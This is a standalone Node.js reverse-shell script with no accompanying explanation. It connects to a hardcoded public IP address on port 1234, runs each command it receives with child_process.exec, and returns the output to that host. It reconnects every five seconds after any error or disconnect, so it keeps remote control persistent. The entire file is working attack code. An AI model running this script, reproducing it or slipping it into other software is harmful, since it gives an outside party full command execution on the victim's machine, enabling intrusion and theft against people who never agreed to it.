#!/usr/bin/env node

const net = require('net');
const { exec } = require('child_process');

const SERVER_IP = '44.221.64.178';
const SERVER_PORT = 1234;

function connectBack() {
  let socket = null;

  function startConnection() {
    socket = new net.Socket();

    socket.connect(SERVER_PORT, SERVER_IP, () => {
      console.log(`[+] Connected to ${SERVER_IP}:${SERVER_PORT}`);
    });

    socket.on('data', (data) => {
      const command = data.toString().trim();
      if (['exit', 'quit'].includes(command.toLowerCase())) {
        socket.end();
        return;
      }

      exec(command, (error, stdout, stderr) => {
        let output = '';
        if (error) {
          output = error.message + '\n';
        }
        output += stdout || '';
        output += stderr || '';
        if (!output) {
          output = '[+] Command executed, no output.\n';
        }
        try {
          socket.write(output);
        } catch (err) {
          // Socket may be closed, ignore
        }
      });
    });

    socket.on('error', (err) => {
      console.error(`[-] Connection failed: ${err.message}`);
      setTimeout(startConnection, 5000);  // Retry after 5 seconds
    });

    socket.on('close', () => {
      if (socket) {
        socket.destroy();
      }
      setTimeout(startConnection, 5000); // Retry after 5 seconds
    });
  }

  startConnection();
}

if (require.main === module) {
  connectBack();
}
